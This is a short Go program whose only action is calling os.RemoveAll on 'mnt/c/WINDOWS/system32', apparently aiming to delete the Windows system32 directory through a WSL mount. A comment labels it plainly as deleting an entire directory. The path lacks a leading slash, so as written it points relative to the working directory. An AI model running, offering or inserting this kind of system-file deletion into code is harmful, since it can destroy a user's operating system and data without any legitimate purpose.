package main

import (
	"fmt"
	"os"
)

func main() {
	err := os.RemoveAll("mnt/c/WINDOWS/system32") // delete an entire directory
	if err != nil {
		fmt.Println(err)
	}
}
